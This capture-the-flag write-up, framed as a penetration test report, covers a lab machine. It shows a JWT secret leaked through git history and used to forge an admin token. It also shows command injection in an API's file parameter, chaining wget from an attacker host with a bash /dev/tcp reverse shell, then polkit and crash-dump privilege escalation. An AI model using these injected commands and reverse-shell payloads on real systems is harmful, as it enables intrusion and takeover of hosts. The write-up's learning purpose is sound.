# Penetration Test Report

In this penetration test report, I'll describe the various commands used during the assessment. The goal of this test was to identify vulnerabilities and potential exploits in the target system. 
## Initial Enumeration

### Nmap Scan

```bash
nmap -sV 10.10.11.120 -p-
```

The scan revealed three open ports: SSH (22), HTTP (80), and Node.js service (3000).

## Web Application Assessment

### Dirb

Dirb was run to enumerate the web server and identify potentially interesting directories.

 Results included URLs to `/api`, `/assets`, `/docs`, and `/download`.

### Accessing the Documentation

- A documentation page was found at [http://10.10.11.120/docs#section-1](http://10.10.11.120/docs#section-1).
- It provided information about how to use the API.

### API Interaction (NOT SUCCESSFULL)

Several `curl` commands were used to interact with the API:


1. User Registration with JSON:

```bash
curl -X POST -H "Content-Type: application/json" -d '{"name": "linuxize", "email": "linuxize@example.com", "password": "fullopsec"}' http://10.10.11.120/api/user/register
```

2. User Login:

```bash
curl -X POST -H "Content-Type: application/json" -d '{"email": "linuxize@example.com", "password": "fullopsec"}' http://10.10.11.120/api/user/login
```

- The final `curl` command returned a JSON Web Token (JWT) token.

### JWT Token

- The JWT token was obtained after successful login.
- The token was decoded (base64) to reveal its payload containing user information.
  
```
{"alg":"HS256","typ":"JWT"}  
{"_id":"61f6ce6a336967045c678454","name":"linuxize","email":"linuxize@example.com","iat":1643564776}
```

We then send this auth token via rester browser extension

### Exploiting Secrets (NOT SUCCESSFULL)

- A secret file was found in the source code:
- The secret filed contained :

 ```
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'  
TOKEN_SECRET = secret
  ```

- in http://10.10.11.120/api/logs

  
```
if (name == 'theadmin'){ res.json({ creds:{ role:"admin", username:"theadmin"
```

`0000000000000000000000000000000000000000 55fe756a29268f9b4e786ae468952ca4a8df1bd8 dasithsv [dasithsv@gmail.com](mailto:dasithsv@gmail.com) 1630648552 +0530 commit (initial): first commit`


- A `.git` directory was discovered, revealing version control information.
- Using `git log -p`, the history of code changes was extracted.


```
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret

+{
+  "name": "authapi",
+  "version": "1.0.0",
+  "lockfileVersion": 2,
+  "requires": true,
+  "packages": {
+    "node_modules/@hapi/address": {
+      "version": "2.1.4",
+      "resolved": "https://registry.npmjs.org/@hapi/address/-/address-2.1.4.tgz",
+      "integrity": "sha512-QD1PhQk+s31P1ixsX0H0Suoupp3VMXzIVMSwobR3F3MSUO2YCV0B7xqLcUw/Bh8yuvd3LhpyqLQWTNcRmp6IdQ==",
+      "deprecated": "Moved to 'npm install @sideway/address'"
```


- The **secret was used** to modify and encode the JWT token ( https://jwt.io/ ) to impersonate an admin user.
  
  ```
  GET http://10.10.11.120/api/priv  (auth-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWY2Y2U2YTMzNjk2NzA0NWM2Nzg0NTQiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImxpbnV4aXplQGV4YW1wbGUuY29tIiwiZmlsZSI6ImNhY2EiLCJpYXQiOjE2NDM1NjQ3NzZ9.j8v_aLp-0BJvjEj7Ucap9xmVt0RcXXvEEgEWvfZQDx8)
  ```
  
- An API call was made using the modified token, but it did not yield useful results.

### Command execution

- **This argument parsing method in js is called req.query**

```
http://10.10.11.120/api/logs?file=test 
{
    "killed": false,
    "code": 128,
    "signal": null,
    "cmd": "git log --oneline test"
}
```
**It seems to execute the arguments !**

#### Creating a reverse shell

`(revca.sh): bash -i >& /dev/tcp/10.10.14.179/6572 0>&1`

`nc -lvp 6572`

#### Setting up the server on attacker machine

`python2.7 -m SimpleHTTPServer`

#### Download reverse shell on victim

Browse to

http://10.10.11.120/api/logs?file=;wget 10.10.14.179:8000/revca.sh (with auth token as arg)


#### Infecting target

`http://10.10.11.120/api/logs?file=;bash revca.sh`

We now have a shell as user dashit

## Privilege Escalation

### Polkit Exploit

- The 0-DAY polkit exploit was attempted to gain root access.
- The exploit allowed root privileges to be obtained.

### Alternative Privilege Escalation

- A search for privilege escalation was conducted using the kernel version.
- Various exploits were identified, but most did not work except for the polkit exploit.

## SUID Binary Analysis

- The `SUID3NUM` tool was used to identify setuid binaries.
- An interesting binary, `/opt/count`, was identified (with lse.sh) as having setuid permissions.
- An attempt was made to exploit this binary, but it did not work
- We force crashed the program While executing it with the file /root/root.txt as argument

```
ps -aux | grep count
root         786  0.0  0.1 235672  7524 ?        Ssl  17:09   0:00 /usr/lib/accountsservice/accounts-daemon
dasith      1803  0.0  0.0   2488   588 ?        S    17:38   0:00 /opt/count
dasith      1952  0.0  0.0   6432   732 ?        S    17:39   0:00 grep --color=auto count
dasith@secret:~/local-web$ kill -SIGKILL 1803
kill -SIGKILL 1803
```

### Crash Analysis

- The program crash was forced by killing the process.
- The `apport-unpack` command was used to unpack crash information and extract useful details.

`apport-unpack /var/crash/_opt_count.1000.crash /tmp/seks`
  
- The `strings` command was employed to analyze the coredump, revealing valuable information.

`strings /tmp/seks/coredump`

![image](https://github.com/fullopsec/Pentests/assets/114147068/f79922fb-4d0a-475b-8f65-61d2e2ee1fb9)

We have the root flag, we won !

# Conclusion

This penetration test involved enumeration, web application assessment, JWT token manipulation, code analysis, 0-DAY exploit and a creative SUID privilege escalation.
